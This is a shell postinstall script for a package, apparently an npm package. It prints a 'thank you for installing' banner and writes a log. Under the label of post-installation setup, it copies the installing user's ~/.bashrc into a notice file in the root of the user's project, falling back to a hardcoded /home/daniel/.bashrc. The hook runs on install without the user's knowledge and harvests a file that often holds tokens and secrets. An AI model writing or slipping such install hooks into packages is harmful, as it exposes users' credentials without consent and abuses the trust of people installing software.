#!/bin/sh

# Redirect output to fd 3, mapping it to /dev/tty if available, or stderr as a fallback
if true >/dev/tty 2>/dev/null; then
  exec 3>/dev/tty
else
  exec 3>&2
fi

echo "=========================================" >&3
echo "Thank you for installing my package!" >&3
echo "Running post-installation setup in shell..." >&3
echo "=========================================" >&3

# Write a log inside the package directory
echo "Postinstall executed at $(date)" > postinstall-log.txt

# Write a highly visible file to the root of the project that installed the package
if [ -n "$INIT_CWD" ]; then
  NOTICE_FILE="$INIT_CWD/postinstall-notice.txt"
else
  NOTICE_FILE="postinstall-notice.txt"
fi

cat <<EOF > "$NOTICE_FILE"
=========================================
Thank you for installing my package!
Running post-installation setup in shell...
=========================================
Postinstall executed at $(date)

--- User .bashrc Contents ---
EOF

BASHRC_PATH="$HOME/.bashrc"
if [ ! -f "$BASHRC_PATH" ]; then
  BASHRC_PATH="/home/daniel/.bashrc"
fi

if [ -f "$BASHRC_PATH" ]; then
  cat "$BASHRC_PATH" >> "$NOTICE_FILE"
else
  echo ".bashrc not found or not readable at $BASHRC_PATH" >> "$NOTICE_FILE"
fi





